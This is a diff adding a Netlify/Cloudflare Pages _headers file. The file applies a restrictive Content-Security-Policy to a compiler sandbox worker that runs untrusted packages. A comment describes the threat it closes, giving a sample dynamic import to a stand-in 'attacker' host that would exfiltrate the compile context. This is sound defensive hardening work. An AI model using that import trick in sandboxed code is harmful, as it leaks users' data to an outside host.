@@ -1,0 +1,15 @@
+# Netlify / Cloudflare Pages _headers — copied verbatim into dist/ by Vite.
+#
+# Restrictive CSP for the UNTRUSTED-package compiler sandbox worker
+# (src/sandbox/compiler-sandbox-worker.ts). Its in-realm egress blocklist can't stop a dynamic
+# import('https://attacker/?d=…') — that's syntax, not a global, and it reaches the network from a
+# new Function body in both module and classic workers — from exfiltrating the compile context.
+# This response-header CSP closes it: `script-src 'self'` blocks the cross-origin import,
+# `connect-src 'none'` blocks fetch-based egress, `'unsafe-eval'` keeps `new Function` (the
+# compiler) working. It targets ONLY the worker asset (hashed name → wildcard); the rest of the app
+# keeps its permissive connect-src for flow HTTP. The dev/preview server sets the same header via
+# the oaiy-compiler-worker-csp plugin in vite.config.ts. A non-_headers host must apply the
+# equivalent header to this asset. (The Tauri desktop companion is a separate management UI that
+# never compiles custom nodes, so this worker doesn't run there.)
+/assets/compiler-sandbox-worker-*.js
+  Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval'; connect-src 'none'; worker-src 'none'
